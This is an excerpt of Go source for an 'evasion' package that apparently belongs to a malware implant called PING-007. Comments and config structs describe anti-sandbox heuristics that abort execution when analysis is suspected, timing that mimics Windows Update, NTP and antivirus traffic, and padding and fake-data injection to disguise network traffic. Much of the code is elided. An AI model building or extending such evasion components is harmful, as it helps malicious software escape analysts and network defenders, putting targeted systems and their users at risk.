// Package evasion implements runtime evasion techniques for PING-007: sandbox
// detection, adaptive timing (mimicking Windows Update, NTP, antivirus), and
// traffic obfuscation via padding and fake-data injection. Each technique is
// independently configurable and composable — enable only what you need.
package evasion
...
// EvasionEngine coordinates sandbox detection, timing control, and traffic
// obfuscation. Create it once via NewEvasionEngine and call methods on it from
// the orchestrator.
...
// EvasionConfig is the flat configuration struct passed to NewEvasionEngine.
...
// AntiSandboxConfig controls the sandbox heuristic checks and their thresholds.
type AntiSandboxConfig struct {
	Enabled      bool
	StrictMode   bool     // if true, abort on confidence > 0.3 instead of 0.5
	Checks       []string // enabled checks: uptime, processes, resources, activity
	MinUptime    time.Duration
	MinProcesses int
}

// TimingEvasionConfig controls adaptive delays and service-mimicry behavior.
type TimingEvasionConfig struct {
	Enabled          bool
	AdaptiveDelays   bool
	ServiceMimicry   []string // services to mimic: windows_update, ntp_sync, antivirus
	JitterPercentage float64
}

// NewEvasionEngine creates an evasion engine with initialized sandbox detector,
// timing controller, and traffic obfuscator.
...
func (to *TrafficObfuscator) applyPadding(data []byte) []byte {
	...
	// Select random padding size — clamp with % to guard against generateRandomFloat() == 1.0
	paddingSize := to.paddingSizes[int(generateRandomFloat()*float64(len(to.paddingSizes)))%len(to.paddingSizes)]
